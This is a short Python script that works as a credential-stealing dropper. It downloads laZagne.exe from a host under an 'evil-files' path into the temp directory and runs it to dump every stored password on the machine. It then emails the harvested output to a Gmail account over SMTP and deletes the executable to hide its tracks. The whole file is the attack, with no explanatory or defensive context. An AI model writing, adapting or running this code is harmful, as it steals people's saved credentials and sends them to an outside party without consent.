#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    if get_response.status_code == 200:
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as out_file:
            out_file.write(get_response.content)
    else:
        print(f"Failed to retrieve the file. Status code: {get_response.status_code}")

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://00.0.0.00/evil-files/laZagne.exe")
result = subprocess.check_output("laZagne.exe all")
send_mail("john@gmail.com", "password", result)
os.remove("laZagne.exe")